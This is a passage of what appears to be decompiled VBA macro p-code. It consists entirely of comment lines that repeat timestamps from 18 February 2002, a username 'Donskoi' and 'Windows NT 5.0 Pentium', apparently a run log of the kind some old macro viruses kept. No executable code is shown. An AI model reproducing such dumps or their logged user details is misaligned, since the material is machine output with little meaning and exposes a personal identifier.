' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5790:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5791:
' Line #5792:
' Line #5793:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:18:20"
' Line #5794:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5795:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5796:
' Line #5797:
' Line #5798:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:18:28"
' Line #5799:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5800:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5801:
' Line #5802:
' Line #5803:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:18:29"
' Line #5804:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5805:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5806:
' Line #5807:
' Line #5808:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:19:08"
' Line #5809:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5810:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5811:
' Line #5812:
' Line #5813:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:20:20"
' Line #5814:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5815:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5816:
' Line #5817:
' Line #5818:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:20:39"
' Line #5819:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5820:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5821:
' Line #5822:
' Line #5823:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:21:12"
' Line #5824:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5825:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5826:
' Line #5827:
' Line #5828:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:23:48"
' Line #5829:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5830:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5831:
' Line #5832:
' Line #5833:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:24:19"
' Line #5834:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5835:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5836:
' Line #5837:
' Line #5838:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:25:37"
' Line #5839:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5840:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5841:
' Line #5842:
' Line #5843:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:27:03"
' Line #5844:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5845:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5846:
' Line #5847:
' Line #5848:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:29:11"
' Line #5849:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5850:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5851:
' Line #5852:
' Line #5853:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:30:18"
' Line #5854:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5855:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5856:
' Line #5857:
' Line #5858:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:31:03"
' Line #5859:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5860:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5861:
' Line #5862:
' Line #5863:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:31:16"
' Line #5864:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5865:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5866:
' Line #5867:
' Line #5868:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:31:18"
' Line #5869:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5870:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5871:
' Line #5872:
' Line #5873:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:31:57"
' Line #5874:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5875:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5876:
' Line #5877:
' Line #5878:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:31:59"
' Line #5879:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5880:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5881:
' Line #5882:
' Line #5883:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:32:07"
' Line #5884:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5885:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5886:
' Line #5887:
' Line #5888:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:32:09"
' Line #5889:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5890:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5891:
' Line #5892:
' Line #5893:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:32:22"
' Line #5894:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5895:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5896:
' Line #5897:
' Line #5898:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:32:37"
' Line #5899:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5900:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5901:
' Line #5902:
' Line #5903:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:54:56"
' Line #5904:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5905:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5906:
' Line #5907:
' Line #5908:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 5:57:15"
' Line #5909:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5910:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5911:
' Line #5912:
' Line #5913:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 6:04:21"
' Line #5914:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5915:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5916:
' Line #5917:
' Line #5918:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 6:04:46"
' Line #5919:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5920:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5921:
' Line #5922:
' Line #5923:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 6:06:10"
' Line #5924:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5925:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5926:
' Line #5927:
' Line #5928:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 6:52:34"
' Line #5929:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5930:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5931:
' Line #5932:
' Line #5933:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 6:54:52"
' Line #5934:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5935:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5936:
' Line #5937:
' Line #5938:
' 	QuoteRem 0x0000 0x0012 "18.02.2002 8:50:44"
' Line #5939:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5940:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5941:
' Line #5942:
' Line #5943:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:27:17"
' Line #5944:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5945:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5946:
' Line #5947:
' Line #5948:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:27:45"
' Line #5949:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5950:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5951:
' Line #5952:
' Line #5953:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:30:30"
' Line #5954:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5955:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5956:
' Line #5957:
' Line #5958:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:31:37"
' Line #5959:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5960:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5961:
' Line #5962:
' Line #5963:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:32:24"
' Line #5964:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5965:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5966:
' Line #5967:
' Line #5968:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:32:26"
' Line #5969:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5970:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5971:
' Line #5972:
' Line #5973:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:33:08"
' Line #5974:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5975:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5976:
' Line #5977:
' Line #5978:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:34:36"
' Line #5979:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5980:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5981:
' Line #5982:
' Line #5983:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:34:55"
' Line #5984:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5985:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5986:
' Line #5987:
' Line #5988:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:37:37"
' Line #5989:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5990:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5991:
' Line #5992:
' Line #5993:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:38:24"
' Line #5994:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #5995:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #5996:
' Line #5997:
' Line #5998:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:38:45"
' Line #5999:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6000:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6001:
' Line #6002:
' Line #6003:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:39:35"
' Line #6004:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6005:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6006:
' Line #6007:
' Line #6008:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:40:13"
' Line #6009:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6010:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6011:
' Line #6012:
' Line #6013:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:40:22"
' Line #6014:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6015:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6016:
' Line #6017:
' Line #6018:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:42:10"
' Line #6019:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6020:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6021:
' Line #6022:
' Line #6023:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:43:01"
' Line #6024:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6025:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6026:
' Line #6027:
' Line #6028:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:44:03"
' Line #6029:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6030:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6031:
' Line #6032:
' Line #6033:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:44:05"
' Line #6034:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6035:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6036:
' Line #6037:
' Line #6038:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 10:44:17"
' Line #6039:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6040:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6041:
' Line #6042:
' Line #6043:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 11:07:41"
' Line #6044:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6045:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6046:
' Line #6047:
' Line #6048:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:39:30"
' Line #6049:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6050:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6051:
' Line #6052:
' Line #6053:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:41:40"
' Line #6054:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6055:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6056:
' Line #6057:
' Line #6058:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:42:56"
' Line #6059:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6060:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6061:
' Line #6062:
' Line #6063:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:48:23"
' Line #6064:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6065:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6066:
' Line #6067:
' Line #6068:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:50:32"
' Line #6069:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6070:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6071:
' Line #6072:
' Line #6073:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:51:19"
' Line #6074:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6075:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6076:
' Line #6077:
' Line #6078:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:51:30"
' Line #6079:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6080:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6081:
' Line #6082:
' Line #6083:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:52:01"
' Line #6084:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6085:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6086:
' Line #6087:
' Line #6088:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:52:03"
' Line #6089:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6090:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6091:
' Line #6092:
' Line #6093:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:52:38"
' Line #6094:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6095:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6096:
' Line #6097:
' Line #6098:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:54:19"
' Line #6099:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6100:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6101:
' Line #6102:
' Line #6103:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:54:50"
' Line #6104:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6105:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6106:
' Line #6107:
' Line #6108:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:56:00"
' Line #6109:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6110:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6111:
' Line #6112:
' Line #6113:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:56:02"
' Line #6114:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6115:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6116:
' Line #6117:
' Line #6118:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:56:26"
' Line #6119:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6120:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6121:
' Line #6122:
' Line #6123:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:56:37"
' Line #6124:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6125:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6126:
' Line #6127:
' Line #6128:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:57:21"
' Line #6129:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6130:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6131:
' Line #6132:
' Line #6133:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 12:58:09"
' Line #6134:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6135:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6136:
' Line #6137:
' Line #6138:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 13:03:24"
' Line #6139:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6140:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6141:
' Line #6142:
' Line #6143:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 13:03:34"
' Line #6144:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6145:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6146:
' Line #6147:
' Line #6148:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 16:39:13"
' Line #6149:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6150:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6151:
' Line #6152:
' Line #6153:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 16:42:42"
' Line #6154:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6155:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6156:
' Line #6157:
' Line #6158:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 16:43:12"
' Line #6159:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6160:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6161:
' Line #6162:
' Line #6163:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 16:48:19"
' Line #6164:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6165:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6166:
' Line #6167:
' Line #6168:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:23:49"
' Line #6169:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6170:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6171:
' Line #6172:
' Line #6173:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:23:56"
' Line #6174:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6175:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6176:
' Line #6177:
' Line #6178:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:24:03"
' Line #6179:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6180:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6181:
' Line #6182:
' Line #6183:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:24:10"
' Line #6184:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6185:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6186:
' Line #6187:
' Line #6188:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:24:40"
' Line #6189:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6190:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6191:
' Line #6192:
' Line #6193:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:24:49"
' Line #6194:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6195:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6196:
' Line #6197:
' Line #6198:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:24:55"
' Line #6199:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6200:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6201:
' Line #6202:
' Line #6203:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:25:07"
' Line #6204:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6205:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6206:
' Line #6207:
' Line #6208:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:26:05"
' Line #6209:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6210:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6211:
' Line #6212:
' Line #6213:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:26:20"
' Line #6214:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6215:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6216:
' Line #6217:
' Line #6218:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:27:15"
' Line #6219:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6220:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6221:
' Line #6222:
' Line #6223:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:27:37"
' Line #6224:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6225:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6226:
' Line #6227:
' Line #6228:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:28:10"
' Line #6229:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6230:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6231:
' Line #6232:
' Line #6233:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:28:32"
' Line #6234:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6235:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6236:
' Line #6237:
' Line #6238:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:28:50"
' Line #6239:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6240:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6241:
' Line #6242:
' Line #6243:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:29:56"
' Line #6244:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6245:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6246:
' Line #6247:
' Line #6248:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:31:26"
' Line #6249:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6250:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6251:
' Line #6252:
' Line #6253:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:31:52"
' Line #6254:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6255:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6256:
' Line #6257:
' Line #6258:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:34:32"
' Line #6259:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6260:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6261:
' Line #6262:
' Line #6263:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:34:57"
' Line #6264:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6265:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6266:
' Line #6267:
' Line #6268:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:37:10"
' Line #6269:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6270:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6271:
' Line #6272:
' Line #6273:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:37:51"
' Line #6274:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6275:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6276:
' Line #6277:
' Line #6278:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:38:36"
' Line #6279:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6280:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6281:
' Line #6282:
' Line #6283:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:39:00"
' Line #6284:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6285:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6286:
' Line #6287:
' Line #6288:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:40:15"
' Line #6289:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6290:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6291:
' Line #6292:
' Line #6293:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:41:36"
' Line #6294:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6295:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6296:
' Line #6297:
' Line #6298:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:42:00"
' Line #6299:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6300:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6301:
' Line #6302:
' Line #6303:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:42:39"
' Line #6304:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6305:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6306:
' Line #6307:
' Line #6308:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:42:52"
' Line #6309:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6310:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6311:
' Line #6312:
' Line #6313:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:43:28"
' Line #6314:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6315:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6316:
' Line #6317:
' Line #6318:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:44:41"
' Line #6319:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6320:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6321:
' Line #6322:
' Line #6323:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:45:40"
' Line #6324:
